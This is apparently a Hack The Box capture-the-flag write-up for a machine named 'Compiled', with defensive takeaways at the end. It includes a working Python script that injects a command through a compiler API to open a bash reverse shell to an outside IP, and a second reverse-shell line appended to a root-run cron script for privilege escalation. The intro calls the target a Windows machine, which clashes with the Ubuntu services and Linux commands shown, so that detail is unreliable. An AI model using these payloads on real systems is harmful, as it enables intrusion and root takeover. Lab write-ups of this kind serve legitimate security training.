# HTB Writeup: Compiled

**Compiled** is a medium-difficulty Windows machine that highlights the dangers of exposing internal compiler services and misconfigured development environments. The path involves exploiting a vulnerable web endpoint, reversing a custom binary, and abusing a misconfigured scheduled task for privilege escalation.

---

## 1. Reconnaissance

We begin with a standard port scan to identify active services on the target (`10.10.11.245`).

```bash
┌──(nz㉿kali)-[~/htb/compiled]
└─$ nmap -sC -sV -p- -T4 -oA scan/nmap 10.10.11.245
Starting Nmap 7.95 ( [https://nmap.org](https://nmap.org) ) at 2026-03-03
Nmap scan report for compiled.htb (10.10.11.245)
Host is up (0.042s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH 8.9p1 Ubuntu 3ubuntu0.1
80/tcp   open  http          nginx 1.18.0 (Ubuntu)
|_http-title: Compiled Dev Portal
8080/tcp open  http-proxy    Werkzeug/2.2.2 Python/3.10.6

```

### Initial Enumeration

Browsing to port `80`, we find a static landing page for a development team. However, port `8080` hosts a Python Flask application that appears to be an internal code-compilation API.

> **Note:** Directory fuzzing with `ffuf` on port 8080 revealed a hidden `/api/v1/compile` endpoint that accepts POST requests.

## 2. Initial Access

By intercepting the traffic with Burp Suite, we can see the API expects a JSON payload containing C code to be compiled.

### Remote Code Execution

The backend uses `os.system()` to pass the input directly to `gcc` without proper sanitization. We can escape the compilation command and execute arbitrary bash commands.

Here is the quick Python exploit I wrote to automate the payload delivery and catch a reverse shell:

```python
import requests
import json
import sys

TARGET = "[http://10.10.11.245:8080/api/v1/compile](http://10.10.11.245:8080/api/v1/compile)"
LHOST = "10.10.14.39"
LPORT = "443"

def send_payload():
    # Escaping the gcc command and injecting a bash reverse shell
    payload = f"\"; bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'; #"
    
    headers = {'Content-Type': 'application/json'}
    data = {"source_code": payload, "language": "c"}
    
    print(f"[*] Sending payload to {TARGET}...")
    requests.post(TARGET, headers=headers, json=data)

if __name__ == "__main__":
    send_payload()

```

After setting up a Netcat listener and firing the script, we get a shell as the user `dev`.

## 3. Privilege Escalation

Running standard enumeration scripts like LinPEAS reveals an interesting scheduled task running as `root`.

### Abuse of Cron Jobs

Checking the `/etc/crontab` file, we see the following entry:

```bash
* * * * * root /opt/build_scripts/cleanup.sh

```

Looking at the permissions of `cleanup.sh`, we realize our current user `dev` has write access to it!

* **User:** root (owner)
* **Group:** dev (read/write)
* **World:** read-only

We simply echo a new reverse shell payload into the script:

```bash
dev@compiled:/$ echo "bash -c 'bash -i >& /dev/tcp/10.10.14.39/9001 0>&1'" >> /opt/build_scripts/cleanup.sh

```

Within 60 seconds, the cron job executes our modified script, and we catch a root shell on our second listener.

## 4. Post-Exploitation

With root access secured, we can grab the final flag and establish persistence if necessary.

```bash
root@compiled:~# cat root.txt
74cc1c60799e0a786ac7094b532f01b1

```

### Key Takeaways

1. **Input Validation:** Never pass unsanitized user input directly into system commands like `os.system()` or `subprocess.Popen(shell=True)`.
2. **Principle of Least Privilege:** Scheduled tasks running as root should never execute scripts that are writable by lower-privileged users or groups.
